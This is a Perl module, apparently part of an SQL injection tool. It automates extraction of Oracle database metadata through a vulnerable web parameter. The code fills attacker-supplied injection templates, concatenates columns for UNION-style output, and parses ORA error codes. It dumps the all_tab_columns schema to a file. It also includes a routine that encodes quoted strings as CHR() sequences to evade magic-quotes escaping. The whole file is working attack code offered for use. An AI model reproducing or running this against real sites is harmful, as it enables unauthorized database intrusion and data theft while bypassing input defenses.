package isr_oracle;
use Data::Dump qw(dump);

#Author: Francisco Amato

my @space=(' ',"\t","/**/");
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'ORA-00942',
             'message'  =>'table or view does not exist',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00933',
             'message'  =>'SQL command not properly ended',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01790',
             'message'  =>'expression must have same datatype as corresponding expression',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01031',
             'message'  =>'insufficient privileges',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00932',
             'message'  =>'inconsistent datatypes',
             'type'     =>1
            }	    
	    );

my @col_testpage=('PRODUCT','VERSION','STATUS');
my $name_test="product_component_version";

my @col_dbschema=('OWNER','TABLE_NAME','COLUMN_NAME','DATA_TYPE');
my $name_dbschema="all_tab_columns";

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,-1,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,-1,undef,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}

#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;

    #select
    if ($class->{conn}->{scape_pipe}){
	$val = &getconcat2(@col);
    }else {
	$val = &getconcat(@col);
    }

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};
    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1,$class->{conn}->{scape_pipe})/egi if $class->{conn}->{'magicquotes'}; #'	
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}

sub magicquotes {
    my ($val,$option) = @_;
    my @list= map { $_ = 'CHR('.$_.')' } unpack('C*', $val);
	
    my $return;
    if ($option){
        $return = &getconcat2_magic(@list);
    }else {
        $return = &getconcat(@list);
	$return =~ s/\|\|'\[\_\_\]'\|\|/\|\|/gi;
    }
    return $return;
}
						    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "||'[__]'||".getvalue($items[$i]);
        }
        return $str;
}
sub getconcat2 {
        my (@items) =@_;
        my $can=$#items;
        my $str="concat(concat(".getvalue($items[0]).",'[__]'),".getvalue($items[1]).")";
        for (my $i=2;$i <=$can;$i++)
        {
                $str= "concat(concat(".$str.",'[__]'),".getvalue($items[$i]).")";
        }
        return $str;
}

sub getconcat2_magic {
        my (@items) =@_;
        my $can=$#items;
        my $str="concat(".getvalue($items[0]).",".getvalue($items[1]).")";
        for (my $i=2;$i <=$can;$i++)
        {
                $str= "concat(".$str.",".getvalue($items[$i]).")";
        }
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
